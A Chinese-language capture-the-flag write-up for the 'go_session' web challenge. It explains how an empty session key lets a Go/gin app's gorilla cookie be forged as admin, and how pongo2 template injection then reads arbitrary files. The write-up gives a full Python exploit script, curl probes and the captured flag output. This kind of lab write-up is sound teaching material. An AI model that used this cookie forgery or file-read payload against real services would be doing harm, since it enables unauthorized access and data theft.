# go_session — Writeup

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 题目 | go_session |
| 分类 | Web |
| 目标 | `http://49.232.142.230:11527` |
| 附件 | 源码目录 `go_session_4c91af79780fc70a4d21b272ba3a371c/`（`main.go` / `go.mod` / `route/route.go`） |
| 附件 SHA256 | `main.go` = `9867b3e15dac448dd5bf1c1fbb59fe368ebd9566c9a599ead94cb0599570b855`<br>`route/route.go` = `9d6d3b7de0cce094df0d4ec1168de4eeec32f55e9de3cf633b2bd7a3a17b8b75`<br>`go.mod` = `90253d972eb14ba963b99abe171153918fc3d34f2ef12b132884d2f865af2c9f` |
| 技术栈 | Go / gin 1.9.0 / gorilla/sessions 1.2.1（securecookie 1.1.1）/ pongo2 v6.0.0；同容器内另有 Flask + Werkzeug debug（Python 3.11.4） |
| 环境 | Linux 容器，进程 `/app/main`，`APP_CMD=/app/run.sh` |
| Flag | `flag{ced596c133b698a0346cc6f008e57268}` |

## 2. Recon

```bash
$ file go_session_.../main.go        # Go source
$ cat main.go route/route.go
```

`main.go`：

```go
r := gin.Default()
r.GET("/", route.Index)
r.GET("/admin", route.Admin)
r.GET("/flask", route.Flask)
r.Run("0.0.0.0:80")
```

`route/route.go`（关键片段）：

```go
var store = sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))   // (1)

func Index(c *gin.Context) {
	session, _ := store.Get(c.Request, "session-name")
	if session.Values["name"] == nil {
		session.Values["name"] = "guest"
		session.Save(c.Request, c.Writer)
	}
	c.String(200, "Hello, guest")
}

func Admin(c *gin.Context) {
	session, _ := store.Get(c.Request, "session-name")
	if session.Values["name"] != "admin" {                              // (2)
		http.Error(c.Writer, "N0", 500); return
	}
	name := c.DefaultQuery("name", "ssti")
	xssWaf := html.EscapeString(name)
	tpl, err := pongo2.FromString("Hello " + xssWaf + "!")              // (3) SSTI
	if err != nil { panic(err) }
	out, err := tpl.Execute(pongo2.Context{"c": c})                     // (4) gin.Context 入模板
	c.String(200, out)
}

func Flask(c *gin.Context) {
	resp, err := http.Get("http://127.0.0.1:5000/" + c.DefaultQuery("name", "guest"))  // (5) SSRF
	...
}
```

在线探测：

```bash
$ curl -i http://49.232.142.230:11527/
Set-Cookie: session-name=MTc4...hQ==        # 未加密，gob 明文可见
Hello, guest
$ curl -i http://49.232.142.230:11527/admin
HTTP/1.1 500 ... N0
$ curl -i "http://49.232.142.230:11527/flask?name="   # 通过 SSRF 拿到 Flask 报错页
# traceback 显示 /app/app.py: name = request.args['name']; return name + " no ssti"
# Flask app.run(debug=True) -> 暴露 /console（Werkzeug debugger）
```

## 3. 漏洞分析

### 3.1 SESSION_KEY 为空 → 会话可伪造

`NewCookieStore([]byte(os.Getenv("SESSION_KEY")))`。运行环境里 **没有设置 `SESSION_KEY`**（见 `/proc/1/environ`，只有 `FLAG`），所以 `os.Getenv` 返回 `""`，`[]byte("")` 是**非 nil 的空切片**。

securecookie v1.1.1 的 `New(hashKey, blockKey)` 只在 `hashKey == nil` 时报错，空切片可通过：

```go
if hashKey == nil { s.err = errHashKeyNotSet }
```

于是 HMAC-SHA256 的密钥就是空字节串。`CodecsFromPairs` 采用 (auth, enc) 成对语义，单个 key 仅作为认证 key、`blockKey=nil` → 只签名不加密，cookie 里的 gob 明文可见，且**可离线重算 MAC**。

cookie 结构（`securecookie.Encode`）：

```
cookie = base64url( "<timestamp>|<base64url(gob)>|<hmac_sha256>" )
mac    = HMAC-SHA256(SESSION_KEY, "session-name|<timestamp>|<base64url(gob)>")
```

其中 gob 是 `map[interface{}]interface{}{"name":"guest"}`。由于 `"guest"` 与 `"admin"` **等长（5 字节）**，直接做字节替换不会破坏 gob 结构。

### 3.2 pongo2 SSTI + `gin.Context` 入模板

`Admin` 把用户输入拼进模板并执行，且 `Context{"c": c}` 把 `*gin.Context` 暴露给模板。`html.EscapeString` 会转义 `< > & ' "`，所以：

- **不能用字符串字面量**（`'` 和 `"` 都被转义，`{{ 'x' }}`、`{% include "/flag" %}` 都会解析失败 → `panic` → 空 500）。
- 反引号（Go raw string）pongo2 也不支持（`{{ \`x\` }}` → 500）。

绕过方式：用**无参、返回字符串的方法**把任意字符串从 HTTP 请求带进模板，例如 `c.Request.UserAgent()`、`c.ContentType()`、`c.Request.Referer()`。这些表达式不含引号，能安全穿过 `html.EscapeString`。

### 3.3 `{% include %}` 任意文件读

pongo2 的 `{% include <expr> %}` 会调用模板集的 filesystem loader 去解析一个文件。`pongo2.FromString` 用的默认集 loader 支持绝对路径，于是：

```
{% include c.Request.UserAgent() %}      # User-Agent: /flag
```

即可读取任意文件。注意 `c.File(...)` 这类**无返回值方法** pongo2 会拒绝调用：

```
'c.File' must have exactly 1 or 2 output arguments, the second argument must be of type error
```

所以不能用 `c.File`，必须走 `include`。

## 4. 关键中间值

| 名称 | 值 |
| --- | --- |
| Cookie 名 | `session-name` |
| 会话 HMAC key | `b""`（空） |
| gob 载荷 | `...\x05guest`（`guest`→`admin` 等长替换） |
| SSTI 读取载荷 | `{% include c.Request.UserAgent() %}` |
| 伪造 cookie 前缀 | `1789...|<base64url(gob: name=admin)>|<mac>` |
| 读文件路径 | 放在 `User-Agent` 头 |
| Flag 文件 | `/flag` |
| Flag（环境变量备份） | `/proc/1/environ` 中 `FLAG=flag{...}` |

## 5. 攻击链

```
GET /                              -> 取一个真实签名的 cookie（拿 gob 模板）
   |
   +-- 替换 guest->admin，空 key 重算 HMAC
   |
GET /admin  Cookie: forged          -> 通过 name=="admin" 检查
   |
   +-- name={% include c.Request.UserAgent() %}
   +-- User-Agent: /flag
   |
pongo2 include -> 读取 /flag        -> flag{ced596c133b698a0346cc6f008e57268}
```

（`/flask` 的 SSRF→Flask/Werkzeug debugger 是干扰项：Flask 源码明确写着 `name + " no ssti"`，且 debugger console 需要 PIN、SSRF 无法保存 Set-Cookie，用不上。）

## 6. 完整脚本

`exploits/go_session.py`：

```python
#!/usr/bin/env python3
import base64, hashlib, hmac, sys, time
import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "49.232.142.230:11527"
BASE = "http://" + TARGET
COOKIE_NAME = "session-name"
KEY = b""  # SESSION_KEY 未设置

def b64e(b): return base64.urlsafe_b64encode(b).decode()
def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def get_guest_gob(base):
    cookie = requests.get(base + "/", timeout=15).cookies.get(COOKIE_NAME)
    _, inner, _ = b64d(cookie).split(b"|", 2)
    return b64d(inner.decode())

def forge_admin_cookie(base, key=KEY):
    gob = get_guest_gob(base)
    inner = b64e(gob.replace(b"guest", b"admin")).encode()
    ts = str(int(time.time())).encode()
    msg = COOKIE_NAME.encode() + b"|" + ts + b"|" + inner
    mac = hmac.new(key, msg, hashlib.sha256).digest()
    return b64e(ts + b"|" + inner + b"|" + mac)

def read_file(base, cookie, path):
    r = requests.get(base + "/admin",
        params={"name": "{% include c.Request.UserAgent() %}"},
        cookies={COOKIE_NAME: cookie}, headers={"User-Agent": path}, timeout=20)
    body = r.text
    return body[6:-1] if body.startswith("Hello ") and body.endswith("!") else body

cookie = forge_admin_cookie(BASE)
print(read_file(BASE, cookie, "/flag"))
```

运行：

```bash
.venv/bin/python exploits/go_session.py                       # 打远程
.venv/bin/python exploits/go_session.py 127.0.0.1:11527       # 指定目标
```

## 7. 实际输出

```
[*] target: http://49.232.142.230:11527
[*] forged admin session cookie
[*] admin access + pongo2 SSTI confirmed (7*7=49)
--- /flag ---
flag{ced596c133b698a0346cc6f008e57268}
--- /proc/1/environ ---
...FLAG=flag{ced596c133b698a0346cc6f008e57268}...
```

## 8. 踩坑记录

- **引号全被转义**：`html.EscapeString` 同时干掉 `'` 和 `"`，所以 `{{ 'x' }}`、`{% include "/flag" %}` 一律 500（`FromString` 出错 → `panic`）。必须用无引号的表达式（`User-Agent`）传字符串。
- **反引号也不支持**：`{{ \`x\` }}` 仍然 500，不能靠 Go raw string 绕过。
- **无返回值方法被拒**：`c.File(...)` 会报 `must have exactly 1 or 2 output arguments`。只能走 `{% include %}`。
- **Flask/Werkzeug 是干扰**：Flask 应用只做 `name + " no ssti"`；debugger console 需要 PIN，SSRF 用 `http.Get`（GET、无 cookie jar）无法完成解锁，拿不到 RCE。
- **gob 等长替换**：`guest`→`admin` 同为 5 字节才安全；长度不同会破坏 gob 流。

## 9. 验证

- SSTI 探针 `{{7*7}}` 在伪造 cookie 下返回 `Hello 49!`；不带 cookie 时 `/admin` 返回 500 `N0`。
- Flag 由两个独立来源交叉确认：`/flag` 文件内容，以及 `/proc/1/environ` 中的 `FLAG=` 环境变量，二者一致。
